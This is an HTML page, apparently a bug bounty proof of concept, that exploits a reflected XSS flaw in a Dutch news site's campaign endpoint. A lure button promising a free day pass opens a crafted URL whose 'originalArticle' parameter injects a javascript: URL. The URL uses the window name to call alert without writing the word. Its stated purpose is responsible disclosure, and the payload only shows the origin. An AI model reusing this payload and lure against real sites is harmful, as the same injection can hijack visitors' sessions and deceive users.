<!doctype html>
<html lang="nl"><head><meta charset="utf-8"><title>Gratis Dagpas</title>
<style>body{font:17px/1.6 system-ui,sans-serif;background:#fff;color:#111;max-width:620px;margin:0 auto;padding:3rem 1.5rem}
button{font:inherit;font-weight:600;background:#d72236;color:#fff;border:0;padding:.9rem 1.6rem;border-radius:6px;cursor:pointer}
small{color:#666}</style></head>
<body>
<h1>Gratis Dagpas van Het Parool</h1>
<p>Klik hieronder om je gratis dagpas te activeren.</p>
<p><button id="go">Activeer gratis Dagpas</button></p>
<hr>
<p><small>Intigriti bug bounty proof of concept &mdash; researcher <b>ndkhai</b>.
The window is opened with the name <code>alert</code>, so <code>top[name]</code> resolves to
<code>window.alert</code> inside the injected <code>javascript:</code> URL. No data is collected by this page.</small></p>
<script>
var LINK = "https://esales.parool.nl/api/v1/sell/campaign"
  + "?campaignId=iap-PAR-44"
  + "&originalArticle=" + encodeURIComponent("javascript:top[name](location.origin)//");
document.getElementById('go').onclick = function () { window.open(LINK, 'alert'); };
</script>
</body></html>
